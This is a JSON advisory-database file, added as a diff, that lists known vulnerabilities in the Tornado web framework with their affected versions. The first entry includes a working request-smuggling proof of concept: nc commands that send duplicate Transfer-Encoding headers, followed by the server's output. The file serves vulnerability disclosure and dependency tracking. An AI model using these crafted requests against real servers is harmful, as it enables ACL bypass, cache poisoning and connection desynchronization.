@@ -1,0 +1,1946 @@
+{
+  "schema_version": 1,
+  "package": "tornado",
+  "purls": [
+    "pkg:pypi/tornado"
+  ],
+  "generated_at": "2026-05-11T11:29:36+00:00",
+  "conda_versions_total": 31,
+  "advisories": [
+    {
+      "id": "GHSA-753j-mpmx-qq6g",
+      "primary_id": "GHSA-753j-mpmx-qq6g",
+      "aliases": [],
+      "cve_ids": [],
+      "ecosystem": "PyPI",
+      "upstream_name": "tornado",
+      "summary": "Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling') in tornado",
+      "details": "### Summary\nWhen Tornado receives a request with two `Transfer-Encoding: chunked` headers, it ignores them both. This enables request smuggling when Tornado is deployed behind a proxy server that emits such requests. [Pound](https://en.wikipedia.org/wiki/Pound_(networking)) does this.\n\n### PoC\n0. Install Tornado.\n1. Start a simple Tornado server that echoes each received request's body:\n```bash\ncat << EOF > server.py\nimport asyncio\nimport tornado\n\nclass MainHandler(tornado.web.RequestHandler):\n    def post(self):\n        self.write(self.request.body)\n\nasync def main():\n    tornado.web.Application([(r\"/\", MainHandler)]).listen(8000)\n    await asyncio.Event().wait()\n\nasyncio.run(main())\nEOF\npython3 server.py &\n```\n2. Send a valid chunked request:\n```bash\nprintf 'POST / HTTP/1.1\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n1\\r\\nZ\\r\\n0\\r\\n\\r\\n' | nc localhost 8000\n```\n3. Observe that the response is as expected:\n```\nHTTP/1.1 200 OK\nServer: TornadoServer/6.3.3\nContent-Type: text/html; charset=UTF-8\nDate: Sat, 07 Oct 2023 17:32:05 GMT\nContent-Length: 1\n\nZ\n```\n4. Send a request with two `Transfer-Encoding: chunked` headers:\n```\nprintf 'POST / HTTP/1.1\\r\\nTransfer-Encoding: chunked\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n1\\r\\nZ\\r\\n0\\r\\n\\r\\n' | nc localhost 8000\n```\n5. Observe the strange response:\n```\nHTTP/1.1 200 OK\nServer: TornadoServer/6.3.3\nContent-Type: text/html; charset=UTF-8\nDate: Sat, 07 Oct 2023 17:35:40 GMT\nContent-Length: 0\n\nHTTP/1.1 400 Bad Request\n\n```\nThis is because Tornado believes that the request has no message body, so it tries to interpret `1\\r\\nZ\\r\\n0\\r\\n\\r\\n` as its own request, which causes a 400 response. With a little cleverness involving `chunk-ext`s, you can get Tornado to instead respond 405, which has the potential to desynchronize the connection, as opposed to 400 which should always result in a connection closure.\n\n### Impact\nAnyone using Tornado behind a proxy that forwards requests containing multiple `Transfer-Encoding: chunked` headers is vulnerable to request smuggling, which may entail ACL bypass, cache poisoning, or connection desynchronization.\n",
+      "published": "2024-06-06T21:41:20Z",
+      "modified": "2026-02-04T03:06:28.757922Z",
+      "severity": {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/tornadoweb/tornado/security/advisories/GHSA-753j-mpmx-qq6g"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/tornadoweb/tornado/commit/d65f6e71a77f53a1ff0a0dc55704be13f04eb572"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/tornadoweb/tornado"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-753j-mpmx-qq6g",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "6.4.1"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "0.2",
+        "1.0",
+        "1.1",
+        "1.1.1",
+        "1.2",
+        "1.2.1",
+        "2.0",
+        "2.1",
+        "2.1.1",
+        "2.2",
+        "2.2.1",
+        "2.3",
+        "2.4",
+        "2.4.1",
+        "3.0",
+        "3.0.1",
+        "3.0.2",
+        "3.1",
+        "3.1.1",
+        "3.2",
+        "3.2.1",
+        "3.2.2",
+        "4.0",
+        "4.0.1",
+        "4.0.2",
+        "4.1",
+        "4.1b2",
+        "4.2",
+        "4.2.1",
+        "4.2b1",
+        "4.3",
+        "4.3b1",
+        "4.3b2",
+        "4.4",
+        "4.4.1",
+        "4.4.2",
+        "4.4.3",
+        "4.4b1",
+        "4.5",
+        "4.5.1",
+        "4.5.2",
+        "4.5.3",
+        "4.5b1",
+        "4.5b2",
+        "5.0",
+        "5.0.1",
+        "5.0.2",
+        "5.0a1",
+        "5.0b1",
+        "5.1",
+        "5.1.1",
+        "5.1b1",
+        "6.0",
+        "6.0.1",
+        "6.0.2",
+        "6.0.3",
+        "6.0.4",
+        "6.0a1",
+        "6.0b1",
+        "6.1",
+        "6.1b1",
+        "6.1b2",
+        "6.2",
+        "6.2b1",
+        "6.2b2",
+        "6.3",
+        "6.3.1",
+        "6.3.2",
+        "6.3.3",
+        "6.3b1",
+        "6.4",
+        "6.4b1"
+      ],
+      "affected_conda_versions": [
+        "4.2.1",
+        "4.3",
+        "4.4",
+        "4.4.1",
+        "4.4.2",
+        "4.4.3",
+        "4.5.1",
+        "4.5.2",
+        "4.5.3",
+        "5.0.1",
+        "5.0.2",
+        "5.1",
+        "5.1.1",
+        "6.0.1",
+        "6.0.2",
+        "6.0.3",
+        "6.0.4",
+        "6.1",
+        "6.2",
+        "6.3",
+        "6.3.2",
+        "6.3.3",
+        "6.4"
+      ]
+    },
+    {
+      "id": "GHSA-78cv-mqj4-43f7",
+      "primary_id": "GHSA-78cv-mqj4-43f7",
+      "aliases": [],
+      "cve_ids": [],
+      "ecosystem": "PyPI",
+      "upstream_name": "tornado",
+      "summary": "Tornado has incomplete validation of cookie attributes",
+      "details": "Values passed to the `domain`, `path`, and `samesite` arguments of `RequestHandler.set_cookie` were not completely validated in versions of Tornado prior to 6.5.5. In particular, semicolons would be allowed, which could be used to inject attacker-controlled values for other cookie attributes.",
+      "published": "2026-03-11T22:17:00Z",
+      "modified": "2026-03-14T07:28:59.077931Z",
+      "severity": {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/tornadoweb/tornado/security/advisories/GHSA-78cv-mqj4-43f7"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/tornadoweb/tornado/commit/24a2d96ea115f663b223887deb0060f13974c104"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/tornadoweb/tornado"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/tornadoweb/tornado/releases/tag/v6.5.5"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-78cv-mqj4-43f7",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "6.5.5"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "0.2",
+        "1.0",
+        "1.1",
+        "1.1.1",
+        "1.2",
+        "1.2.1",
+        "2.0",
+        "2.1",
+        "2.1.1",
+        "2.2",
+        "2.2.1",
+        "2.3",
+        "2.4",
+        "2.4.1",
+        "3.0",
+        "3.0.1",
+        "3.0.2",
+        "3.1",
+        "3.1.1",
+        "3.2",
+        "3.2.1",
+        "3.2.2",
+        "4.0",
+        "4.0.1",
+        "4.0.2",
+        "4.1",
+        "4.1b2",
+        "4.2",
+        "4.2.1",
+        "4.2b1",
+        "4.3",
+        "4.3b1",
+        "4.3b2",
+        "4.4",
+        "4.4.1",
+        "4.4.2",
+        "4.4.3",
+        "4.4b1",
+        "4.5",
+        "4.5.1",
+        "4.5.2",
+        "4.5.3",
+        "4.5b1",
+        "4.5b2",
+        "5.0",
+        "5.0.1",
+        "5.0.2",
+        "5.0a1",
+        "5.0b1",
+        "5.1",
+        "5.1.1",
+        "5.1b1",
+        "6.0",
+        "6.0.1",
+        "6.0.2",
+        "6.0.3",
+        "6.0.4",
+        "6.0a1",
+        "6.0b1",
+        "6.1",
+        "6.1b1",
+        "6.1b2",
+        "6.2",
+        "6.2b1",
+        "6.2b2",
+        "6.3",
+        "6.3.1",
+        "6.3.2",
+        "6.3.3",
+        "6.3b1",
+        "6.4",
+        "6.4.1",
+        "6.4.2",
+        "6.4b1",
+        "6.5",
+        "6.5.1",
+        "6.5.2",
+        "6.5.3",
+        "6.5.4",
+        "6.5b1"
+      ],
+      "affected_conda_versions": [
+        "4.2.1",
+        "4.3",
+        "4.4",
+        "4.4.1",
+        "4.4.2",
+        "4.4.3",
+        "4.5.1",
+        "4.5.2",
+        "4.5.3",
+        "5.0.1",
+        "5.0.2",
+        "5.1",
+        "5.1.1",
+        "6.0.1",
+        "6.0.2",
+        "6.0.3",
+        "6.0.4",
+        "6.1",
+        "6.2",
+        "6.3",
+        "6.3.2",
+        "6.3.3",
+        "6.4",
+        "6.4.1",
+        "6.4.2",
+        "6.5",
+        "6.5.1",
+        "6.5.2",
+        "6.5.3",
+        "6.5.4"
+      ]
+    },
+    {
+      "id": "GHSA-7cx3-6m66-7c5m",
+      "primary_id": "CVE-2025-47287",
+      "aliases": [
+        "CVE-2025-47287"
+      ],
+      "cve_ids": [
+        "CVE-2025-47287"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "tornado",
+      "summary": "Tornado vulnerable to excessive logging caused by malformed multipart form data",
+      "details": "### Summary\n\nWhen Tornado's ``multipart/form-data`` parser encounters certain errors, it logs a warning but continues trying to parse the remainder of the data. This allows remote attackers to generate an extremely high volume of logs, constituting a DoS attack. This DoS is compounded by the fact that the logging subsystem is synchronous.\n\n### Affected versions\n\nAll versions of Tornado prior to 6.5 are affected. The vulnerable parser is enabled by default.\n\n### Solution\n\nUpgrade to Tornado version 6.5. In the meantime, risk can be mitigated by blocking `Content-Type: multipart/form-data` in a proxy.",
+      "published": "2025-05-16T14:12:40Z",
+      "modified": "2026-02-04T04:10:45.050152Z",
+      "severity": {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/tornadoweb/tornado/security/advisories/GHSA-7cx3-6m66-7c5m"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-47287"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/tornadoweb/tornado/commit/b39b892bf78fe8fea01dd45199aa88307e7162f3"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/tornadoweb/tornado"
+        },
+        {
+          "type": "WEB",
+          "url": "https://lists.debian.org/debian-lts-announce/2025/05/msg00038.html"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-7cx3-6m66-7c5m",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "6.5"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "0.2",
+        "1.0",
+        "1.1",
+        "1.1.1",
+        "1.2",
+        "1.2.1",
+        "2.0",
+        "2.1",
+        "2.1.1",
+        "2.2",
+        "2.2.1",
+        "2.3",
+        "2.4",
+        "2.4.1",
+        "3.0",
+        "3.0.1",
+        "3.0.2",
+        "3.1",
+        "3.1.1",
+        "3.2",
+        "3.2.1",
+        "3.2.2",
+        "4.0",
+        "4.0.1",
+        "4.0.2",
+        "4.1",
+        "4.1b2",
+        "4.2",
+        "4.2.1",
+        "4.2b1",
+        "4.3",
+        "4.3b1",
+        "4.3b2",
+        "4.4",
+        "4.4.1",
+        "4.4.2",
+        "4.4.3",
+        "4.4b1",
+        "4.5",
+        "4.5.1",
+        "4.5.2",
+        "4.5.3",
+        "4.5b1",
+        "4.5b2",
+        "5.0",
+        "5.0.1",
+        "5.0.2",
+        "5.0a1",
+        "5.0b1",
+        "5.1",
+        "5.1.1",
+        "5.1b1",
+        "6.0",
+        "6.0.1",
+        "6.0.2",
+        "6.0.3",
+        "6.0.4",
+        "6.0a1",
+        "6.0b1",
+        "6.1",
+        "6.1b1",
+        "6.1b2",
+        "6.2",
+        "6.2b1",
+        "6.2b2",
+        "6.3",
+        "6.3.1",
+        "6.3.2",
+        "6.3.3",
+        "6.3b1",
+        "6.4",
+        "6.4.1",
+        "6.4.2",
+        "6.4b1",
+        "6.5b1"
+      ],
+      "affected_conda_versions": [
+        "4.2.1",
+        "4.3",
+        "4.4",
+        "4.4.1",
+        "4.4.2",
+        "4.4.3",
+        "4.5.1",
+        "4.5.2",
+        "4.5.3",
+        "5.0.1",
+        "5.0.2",
+        "5.1",
+        "5.1.1",
+        "6.0.1",
+        "6.0.2",
+        "6.0.3",
+        "6.0.4",
+        "6.1",
+        "6.2",
+        "6.3",
+        "6.3.2",
+        "6.3.3",
+        "6.4",
+        "6.4.1",
+        "6.4.2"
+      ]
+    },
+    {
+      "id": "GHSA-8w49-h785-mj3c",
+      "primary_id": "CVE-2024-52804",
+      "aliases": [
+        "CVE-2024-52804"
+      ],
+      "cve_ids": [
+        "CVE-2024-52804"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "tornado",
+      "summary": "Tornado has an HTTP cookie parsing DoS vulnerability",
+      "details": "The algorithm used for parsing HTTP cookies in Tornado versions prior to 6.4.2 sometimes has quadratic complexity, leading to excessive CPU consumption when parsing maliciously-crafted cookie headers. This parsing occurs in the event loop thread and may block the processing of other requests.\n\nSee also CVE-2024-7592 for a similar vulnerability in cpython.",
+      "published": "2024-11-22T20:26:41Z",
+      "modified": "2026-02-04T03:58:17.599003Z",
+      "severity": {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/tornadoweb/tornado/security/advisories/GHSA-8w49-h785-mj3c"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-52804"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/tornadoweb/tornado/commit/d5ba4a1695fbf7c6a3e54313262639b198291533"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/tornadoweb/tornado"
+        },
+        {
+          "type": "WEB",
+          "url": "https://lists.debian.org/debian-lts-announce/2025/01/msg00000.html"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-8w49-h785-mj3c",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "6.4.2"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "0.2",
+        "1.0",
+        "1.1",
+        "1.1.1",
+        "1.2",
+        "1.2.1",
+        "2.0",
+        "2.1",
+        "2.1.1",
+        "2.2",
+        "2.2.1",
+        "2.3",
+        "2.4",
+        "2.4.1",
+        "3.0",
+        "3.0.1",
+        "3.0.2",
+        "3.1",
+        "3.1.1",
+        "3.2",
+        "3.2.1",
+        "3.2.2",
+        "4.0",
+        "4.0.1",
+        "4.0.2",
+        "4.1",
+        "4.1b2",
+        "4.2",
+        "4.2.1",
+        "4.2b1",
+        "4.3",
+        "4.3b1",
+        "4.3b2",
+        "4.4",
+        "4.4.1",
+        "4.4.2",
+        "4.4.3",
+        "4.4b1",
+        "4.5",
+        "4.5.1",
+        "4.5.2",
+        "4.5.3",
+        "4.5b1",
+        "4.5b2",
+        "5.0",
+        "5.0.1",
+        "5.0.2",
+        "5.0a1",
+        "5.0b1",
+        "5.1",
+        "5.1.1",
+        "5.1b1",
+        "6.0",
+        "6.0.1",
+        "6.0.2",
+        "6.0.3",
+        "6.0.4",
+        "6.0a1",
+        "6.0b1",
+        "6.1",
+        "6.1b1",
+        "6.1b2",
+        "6.2",
+        "6.2b1",
+        "6.2b2",
+        "6.3",
+        "6.3.1",
+        "6.3.2",
+        "6.3.3",
+        "6.3b1",
+        "6.4",
+        "6.4.1",
+        "6.4b1"
+      ],
+      "affected_conda_versions": [
+        "4.2.1",
+        "4.3",
+        "4.4",
+        "4.4.1",
+        "4.4.2",
+        "4.4.3",
+        "4.5.1",
+        "4.5.2",
+        "4.5.3",
+        "5.0.1",
+        "5.0.2",
+        "5.1",
+        "5.1.1",
+        "6.0.1",
+        "6.0.2",
+        "6.0.3",
+        "6.0.4",
+        "6.1",
+        "6.2",
+        "6.3",
+        "6.3.2",
+        "6.3.3",
+        "6.4",
+        "6.4.1"
+      ]
+    },
+    {
+      "id": "GHSA-fqwm-6jpj-5wxc",
+      "primary_id": "CVE-2026-35536",
+      "aliases": [
+        "CVE-2026-35536"
+      ],
+      "cve_ids": [
+        "CVE-2026-35536"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "tornado",
+      "summary": "Tornado has cookie attribute injection via .RequestHandler.set_cookie",
+      "details": "In Tornado before 6.5.5, cookie attribute injection could occur because the domain, path, and samesite arguments to `.RequestHandler.set_cookie` were not checked for crafted characters.",
+      "published": "2026-04-03T06:31:31Z",
+      "modified": "2026-05-11T00:41:23.078445617Z",
+      "severity": {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/tornadoweb/tornado/security/advisories/GHSA-78cv-mqj4-43f7"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-35536"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/tornadoweb/tornado"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/tornadoweb/tornado/releases/tag/v6.5.5"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-fqwm-6jpj-5wxc",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "6.5.5"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "0.2",
+        "1.0",
+        "1.1",
+        "1.1.1",
+        "1.2",
+        "1.2.1",
+        "2.0",
+        "2.1",
+        "2.1.1",
+        "2.2",
+        "2.2.1",
+        "2.3",
+        "2.4",
+        "2.4.1",
+        "3.0",
+        "3.0.1",
+        "3.0.2",
+        "3.1",
+        "3.1.1",
+        "3.2",
+        "3.2.1",
+        "3.2.2",
+        "4.0",
+        "4.0.1",
+        "4.0.2",
+        "4.1",
+        "4.1b2",
+        "4.2",
+        "4.2.1",
+        "4.2b1",
+        "4.3",
+        "4.3b1",
+        "4.3b2",
+        "4.4",
+        "4.4.1",
+        "4.4.2",
+        "4.4.3",
+        "4.4b1",
+        "4.5",
+        "4.5.1",
+        "4.5.2",
+        "4.5.3",
+        "4.5b1",
+        "4.5b2",
+        "5.0",
+        "5.0.1",
+        "5.0.2",
+        "5.0a1",
+        "5.0b1",
+        "5.1",
+        "5.1.1",
+        "5.1b1",
+        "6.0",
+        "6.0.1",
+        "6.0.2",
+        "6.0.3",
+        "6.0.4",
+        "6.0a1",
+        "6.0b1",
+        "6.1",
+        "6.1b1",
+        "6.1b2",
+        "6.2",
+        "6.2b1",
+        "6.2b2",
+        "6.3",
+        "6.3.1",
+        "6.3.2",
+        "6.3.3",
+        "6.3b1",
+        "6.4",
+        "6.4.1",
+        "6.4.2",
+        "6.4b1",
+        "6.5",
+        "6.5.1",
+        "6.5.2",
+        "6.5.3",
+        "6.5.4",
+        "6.5b1"
+      ],
+      "affected_conda_versions": [
+        "4.2.1",
+        "4.3",
+        "4.4",
+        "4.4.1",
+        "4.4.2",
+        "4.4.3",
+        "4.5.1",
+        "4.5.2",
+        "4.5.3",
+        "5.0.1",
+        "5.0.2",
+        "5.1",
+        "5.1.1",
+        "6.0.1",
+        "6.0.2",
+        "6.0.3",
+        "6.0.4",
+        "6.1",
+        "6.2",
+        "6.3",
+        "6.3.2",
+        "6.3.3",
+        "6.4",
+        "6.4.1",
+        "6.4.2",
+        "6.5",
+        "6.5.1",
+        "6.5.2",
+        "6.5.3",
+        "6.5.4"
+      ]
+    },
+    {
+      "id": "GHSA-hj3f-6gcp-jg8j",
+      "primary_id": "CVE-2023-28370",
+      "aliases": [
+        "CVE-2023-28370",
+        "PYSEC-2023-75"
+      ],
+      "cve_ids": [
+        "CVE-2023-28370"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "tornado",
+      "summary": "Open redirect in Tornado",
+      "details": "Open redirect vulnerability in Tornado versions 6.3.1 and earlier allows a remote unauthenticated attacker to redirect a user to an arbitrary web site and conduct a phishing attack by having user access a specially crafted URL.",
+      "published": "2023-05-25T12:30:16Z",
+      "modified": "2025-11-04T16:49:24.962077Z",
+      "severity": {
+        "type": "CVSS_V4",
+        "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:N/VI:N/VA:N/SC:L/SI:L/SA:N"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"
+        },
+        {
+          "type": "CVSS_V4",
+          "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:N/VI:N/VA:N/SC:L/SI:L/SA:N"
+        }
+      ],
+      "references": [
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-28370"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/tornadoweb/tornado/commit/32ad07c54e607839273b4e1819c347f5c8976b2f"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/pypa/advisory-database/tree/main/vulns/tornado/PYSEC-2023-75.yaml"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/tornadoweb/tornado"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/tornadoweb/tornado/releases/tag/v6.3.2"
+        },
+        {
+          "type": "WEB",
+          "url": "https://jvn.jp/en/jp/JVN45127776"
+        },
+        {
+          "type": "WEB",
+          "url": "https://lists.debian.org/debian-lts-announce/2025/01/msg00000.html"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-hj3f-6gcp-jg8j",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "6.3.2"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "0.2",
+        "1.0",
+        "1.1",
+        "1.1.1",
+        "1.2",
+        "1.2.1",
+        "2.0",
+        "2.1",
+        "2.1.1",
+        "2.2",
+        "2.2.1",
+        "2.3",
+        "2.4",
+        "2.4.1",
+        "3.0",
+        "3.0.1",
+        "3.0.2",
+        "3.1",
+        "3.1.1",
+        "3.2",
+        "3.2.1",
+        "3.2.2",
+        "4.0",
+        "4.0.1",
+        "4.0.2",
+        "4.1",
+        "4.1b2",
+        "4.2",
+        "4.2.1",
+        "4.2b1",
+        "4.3",
+        "4.3b1",
+        "4.3b2",
+        "4.4",
+        "4.4.1",
+        "4.4.2",
+        "4.4.3",
+        "4.4b1",
+        "4.5",
+        "4.5.1",
+        "4.5.2",
+        "4.5.3",
+        "4.5b1",
+        "4.5b2",
+        "5.0",
+        "5.0.1",
+        "5.0.2",
+        "5.0a1",
+        "5.0b1",
+        "5.1",
+        "5.1.1",
+        "5.1b1",
+        "6.0",
+        "6.0.1",
+        "6.0.2",
+        "6.0.3",
+        "6.0.4",
+        "6.0a1",
+        "6.0b1",
+        "6.1",
+        "6.1b1",
+        "6.1b2",
+        "6.2",
+        "6.2b1",
+        "6.2b2",
+        "6.3",
+        "6.3.1",
+        "6.3b1"
+      ],
+      "affected_conda_versions": [
+        "4.2.1",
+        "4.3",
+        "4.4",
+        "4.4.1",
+        "4.4.2",
+        "4.4.3",
+        "4.5.1",
+        "4.5.2",
+        "4.5.3",
+        "5.0.1",
+        "5.0.2",
+        "5.1",
+        "5.1.1",
+        "6.0.1",
+        "6.0.2",
+        "6.0.3",
+        "6.0.4",
+        "6.1",
+        "6.2",
+        "6.3"
+      ]
+    },
+    {
+      "id": "GHSA-qjxf-f2mg-c6mc",
+      "primary_id": "CVE-2026-31958",
+      "aliases": [
+        "CVE-2026-31958"
+      ],
+      "cve_ids": [
+        "CVE-2026-31958"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "tornado",
+      "summary": "Tornado is vulnerable to DoS due to too many multipart parts",
+      "details": "In versions of Tornado prior to 6.5.5, the only limit on the number of parts in `multipart/form-data` is the `max_body_size` setting (default 100MB). Since parsing occurs synchronously on the main thread, this creates the possibility of denial-of-service due to the cost of parsing very large multipart bodies with many parts. \n\nTornado 6.5.5 introduces new limits on the size and complexity of multipart bodies, including a default limit of 100 parts per request. These limits are configurable if needed; see `tornado.httputil.ParseMultipartConfig`. It is also now possible to disable `multipart/form-data` parsing entirely if it is not required for the application.",
+      "published": "2026-03-12T14:19:52Z",
+      "modified": "2026-05-11T00:41:04.186753335Z",
+      "severity": {
+        "type": "CVSS_V4",
+        "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+        },
+        {
+          "type": "CVSS_V4",
+          "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/tornadoweb/tornado/security/advisories/GHSA-qjxf-f2mg-c6mc"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-31958"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/tornadoweb/tornado/commit/119a195e290c43ad2d63a2cf012c29d43d6ed839"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/tornadoweb/tornado"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/tornadoweb/tornado/releases/tag/v6.5.5"
+        },
+        {
+          "type": "WEB",
+          "url": "https://lists.debian.org/debian-lts-announce/2026/04/msg00000.html"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-qjxf-f2mg-c6mc",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "6.5.5"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "0.2",
+        "1.0",
+        "1.1",
+        "1.1.1",
+        "1.2",
+        "1.2.1",
+        "2.0",
+        "2.1",
+        "2.1.1",
+        "2.2",
+        "2.2.1",
+        "2.3",
+        "2.4",
+        "2.4.1",
+        "3.0",
+        "3.0.1",
+        "3.0.2",
+        "3.1",
+        "3.1.1",
+        "3.2",
+        "3.2.1",
+        "3.2.2",
+        "4.0",
+        "4.0.1",
+        "4.0.2",
+        "4.1",
+        "4.1b2",
+        "4.2",
+        "4.2.1",
+        "4.2b1",
+        "4.3",
+        "4.3b1",
+        "4.3b2",
+        "4.4",
+        "4.4.1",
+        "4.4.2",
+        "4.4.3",
+        "4.4b1",
+        "4.5",
+        "4.5.1",
+        "4.5.2",
+        "4.5.3",
+        "4.5b1",
+        "4.5b2",
+        "5.0",
+        "5.0.1",
+        "5.0.2",
+        "5.0a1",
+        "5.0b1",
+        "5.1",
+        "5.1.1",
+        "5.1b1",
+        "6.0",
+        "6.0.1",
+        "6.0.2",
+        "6.0.3",
+        "6.0.4",
+        "6.0a1",
+        "6.0b1",
+        "6.1",
+        "6.1b1",
+        "6.1b2",
+        "6.2",
+        "6.2b1",
+        "6.2b2",
+        "6.3",
+        "6.3.1",
+        "6.3.2",
+        "6.3.3",
+        "6.3b1",
+        "6.4",
+        "6.4.1",
+        "6.4.2",
+        "6.4b1",
+        "6.5",
+        "6.5.1",
+        "6.5.2",
+        "6.5.3",
+        "6.5.4",
+        "6.5b1"
+      ],
+      "affected_conda_versions": [
+        "4.2.1",
+        "4.3",
+        "4.4",
+        "4.4.1",
+        "4.4.2",
+        "4.4.3",
+        "4.5.1",
+        "4.5.2",
+        "4.5.3",
+        "5.0.1",
+        "5.0.2",
+        "5.1",
+        "5.1.1",
+        "6.0.1",
+        "6.0.2",
+        "6.0.3",
+        "6.0.4",
+        "6.1",
+        "6.2",
+        "6.3",
+        "6.3.2",
+        "6.3.3",
+        "6.4",
+        "6.4.1",
+        "6.4.2",
+        "6.5",
+        "6.5.1",
+        "6.5.2",
+        "6.5.3",
+        "6.5.4"
+      ]
+    },
+    {
+      "id": "GHSA-qppv-j76h-2rpx",
